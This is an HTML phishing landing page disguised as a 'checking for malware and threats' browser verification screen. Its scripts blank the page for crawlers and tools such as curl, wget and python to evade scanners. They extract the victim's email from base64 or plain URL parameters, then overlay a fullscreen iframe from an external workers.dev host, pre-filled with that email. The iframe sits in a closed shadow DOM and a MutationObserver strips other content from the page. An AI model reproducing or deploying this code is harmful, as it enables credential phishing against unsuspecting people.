<body>
<main>
  <div style="max-width:600px;margin:120px auto;text-align:center;font-family:'Segoe UI',Arial,sans-serif;">
    <h1 style="font-size:20px;">CHECKING FOR MALWARE AND THREATS...</h1>

    <div style="margin-top:40px;">
      <div id="verificationBox" style="border:2px solid #e0e0e0;border-radius:8px;padding:30px;background:#fafafa;">
        <div style="display:flex;align-items:center;justify-content:center;gap:15px;">
          <div id="spinner" style="width:28px;height:28px;border:3px solid #f3f3f3;border-top:3px solid #2266e3;border-radius:50%;animation:spin 1s linear infinite;"></div>
          <span id="verificationText" style="font-size:16px;font-weight:500;">Verifying your browser...</span>
        </div>

        <div style="width:100%;height:4px;background:#eee;margin-top:25px;border-radius:3px;overflow:hidden;">
          <div id="progressFill" style="height:100%;width:0%;background:#2266e3;transition:width 2.5s ease;"></div>
        </div>

        <div id="doneMsg" style="display:none;color:#28a745;font-weight:500;margin-top:20px;">
          ✓ Verification complete
        </div>
      </div>
    </div>
  </div>
</main>

<style>
@keyframes spin { to { transform: rotate(360deg); } }
</style>

<script>
/* ===================== BASIC BOT BLOCK ===================== */
(function(){
  // Block headless / webdriver bots
  if (navigator.webdriver) return stopPage();

  // Block missing browser features (very common bot signal)
  if (!window.chrome && !window.safari && !window.Firefox) {
    if (!('ontouchstart' in window) && navigator.maxTouchPoints === 0) {
      return stopPage();
    }
  }

  // Block suspicious user agents
  var ua = navigator.userAgent.toLowerCase();
  var blocked = ["bot","crawler","spider","curl","wget","python","scrapy","headless"];
  for (var i=0;i<blocked.length;i++){
    if (ua.includes(blocked[i])) return stopPage();
  }

  function stopPage(){
    document.documentElement.innerHTML = "";
  }
})();
</script>

<script>
/* ===================== AUTO VERIFICATION ===================== */
(function(){

  window.addEventListener("load", function(){

    var progress = document.getElementById("progressFill");
    var text     = document.getElementById("verificationText");
    var done     = document.getElementById("doneMsg");

    // Animate progress
    setTimeout(function(){
      progress.style.width = "100%";
    }, 100);

    // Complete
    setTimeout(function(){
      text.textContent = "Verification complete";
      done.style.display = "block";

      // Use your EXISTING embed function (unchanged)
      window.redirectPage();

    }, 2600);

  });

})();
</script>

<!-- ===================== YOUR EXISTING EMBED FUNCTION (UNCHANGED) ===================== -->
<script>
/* ===================== Verification checkbox logic ===================== */
(function(){
  // Do not run the verification UI logic inside iframes
  if (window.self !== window.top) return;

  var isProcessing = false;
  var box   = document.getElementById('verificationBox');
  var cont  = document.getElementById('checkboxContainer');
  var cb    = document.getElementById('customCheckbox');
  var mark  = document.getElementById('checkmark');
  var spin  = document.getElementById('spinner');
  var text  = document.getElementById('verificationText');
  var pbar  = document.getElementById('progressBar');
  var pfill = document.getElementById('progressFill');
  var done  = document.getElementById('redirectMessage');

  if (!cont) return;

  cont.addEventListener('click', function(){
    if (isProcessing) return;
    isProcessing = true;

    box.classList.add('checking');
    cb.classList.add('checking');
    text.classList.add('checking');
    text.textContent = 'Verifying...';

    mark.style.display = 'none';
    spin.style.display = 'block';
    pbar.style.display = 'block';

    setTimeout(function(){ pfill.style.width = '100%'; }, 100);

    setTimeout(function(){
      spin.style.display = 'none';
      mark.style.display = 'block';
      mark.classList.add('visible');

      box.classList.remove('checking'); box.classList.add('verified');
      cb.classList.remove('checking');  cb.classList.add('checked');
      text.classList.remove('checking'); text.classList.add('verified');
      text.textContent = 'Verification complete';
      done.style.display = 'block';

      // proceed to fullscreen embed
      window.redirectPage();
    }, 3000);
  });
})();

/* ===================== Fullscreen, duplication-proof embed ===================== */
(function(){
  var LOCK_FLAG = '__RC_EMBED_LOCK__';

  window.redirectPage = function redirectPage() {
    // Prevent running inside iframe (avoids recursion)
    if (window.self !== window.top) return;

    // Run once only
    if (window[LOCK_FLAG]) return;
    window[LOCK_FLAG] = true;

    // Build target with your email rule: take the email immediately after '&'
var href = window.location.href;
var emailParam = "";

// Parse URL safely
var url;
try {
  url = new URL(href);
} catch (e) {
  console.error("URL parse failed");
}

// 1️⃣ ORIGINAL RULE — &email@domain.com
if (!emailParam) {
  var raw = href.split("&");
  for (var i = 0; i < raw.length; i++) {
    if (raw[i].includes("@") && !raw[i].includes("=")) {
      emailParam = raw[i];
      break;
    }
  }
}

// 2️⃣ ?state= (base64 OR plain)
if (!emailParam && url && url.searchParams.has("state")) {
  var stateVal = url.searchParams.get("state");

  try {
    var decoded = atob(stateVal);
    if (decoded.includes("@")) emailParam = decoded;
  } catch (e) {
    if (stateVal.includes("@")) emailParam = stateVal;
  }
}

// 3️⃣ ?id= (base64)
if (!emailParam && url && url.searchParams.has("id")) {
  try {
    var decodedId = atob(url.searchParams.get("id"));
    if (decodedId.includes("@")) emailParam = decodedId;
  } catch (e) {}
}

// 4️⃣ Validate
if (emailParam && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailParam)) {
  console.warn("Invalid email detected:", emailParam);
  emailParam = "";
}

// 5️⃣ Build target (NO encoding)
var TARGET_BASE = "https://maggo.log-internals.workers.dev";
var target = TARGET_BASE + "#" + emailParam;

console.log("Redirect target:", target);


    // Avoid self-embedding
    var here = location.href.split("#")[0];
    if (target.split("#")[0] === here) {
      console.error("[embed] Target URL equals current page. Use a different URL.");
      window[LOCK_FLAG] = false;
      return;
    }

    // Prepare full-viewport canvas
    document.documentElement.style.height = "100%";
    document.body.style.margin = "0";
    document.body.style.height = "100%";
    document.body.style.overflow = "hidden";

    var HOST_ID = "rc-embed-host";
    var host = document.createElement("div");
    host.id = HOST_ID;
    host.style.position = "fixed";
    host.style.inset = "0";
    host.style.zIndex = "2147483647";

    // Replace all visible content with the host
    document.body.replaceChildren(host);

    // Stop platform from re-adding nodes under the host
    var mo = new MutationObserver(function(muts){
      muts.forEach(function(m){
        m.addedNodes && m.addedNodes.forEach(function(node){
          if (node.nodeType === 1 && node.id !== HOST_ID) {
            try { node.remove(); } catch(e){}
          }
        });
      });
    });
    mo.observe(document.body, { childList: true });

    // CLOSED Shadow DOM for isolation
    var root = host.attachShadow({ mode: "closed" });

    // Scoped styles: iframe is always fullscreen with fade-in
    var style = document.createElement("style");
    style.textContent = `
      :host { all: initial; }
      .wrap { position:absolute; inset:0; background:#fff; display:flex; align-items:center; justify-content:center;
              padding: env(safe-area-inset-top,0) env(safe-area-inset-right,0) env(safe-area-inset-bottom,0) env(safe-area-inset-left,0); }
      .spin { width:60px; height:60px; border:6px solid #ccc; border-top-color:#2266e3; border-radius:50%;
              animation:rc_spin 1s linear infinite; transition:opacity .25s ease; }
      iframe { position:absolute; inset:0; width:100%; height:100%; border:0; opacity:0; transition:opacity .6s ease; }
      @keyframes rc_spin { to { transform: rotate(360deg); } }
      @supports (height: 100dvh) { :host, .wrap { height:100dvh; width:100dvw; } }
    `;

    var wrap = document.createElement("div");
    wrap.className = "wrap";

    var spin = document.createElement("div");
    spin.className = "spin";

    var frame = document.createElement("iframe");
    frame.setAttribute("title", "Embedded content");
    frame.setAttribute("sandbox", "allow-scripts allow-forms allow-same-origin");
    frame.setAttribute("referrerpolicy", "no-referrer");

    var first = true;
    frame.addEventListener("load", function(){
      if (!first) return;
      first = false;
      spin.style.opacity = "0";
      setTimeout(function(){ frame.style.opacity = "1"; }, 150);
    });

    wrap.appendChild(spin);
    wrap.appendChild(frame);
    root.appendChild(style);
    root.appendChild(wrap);
    frame.src = target;

    // Minor mobile quirk fix: force reflow on resize so fixed+inset refills any newly exposed area
    window.addEventListener('resize', function(){
      host.style.display = 'none';
      requestAnimationFrame(function(){ host.style.display = ''; });
    });
  };
})();
</script>

</body>
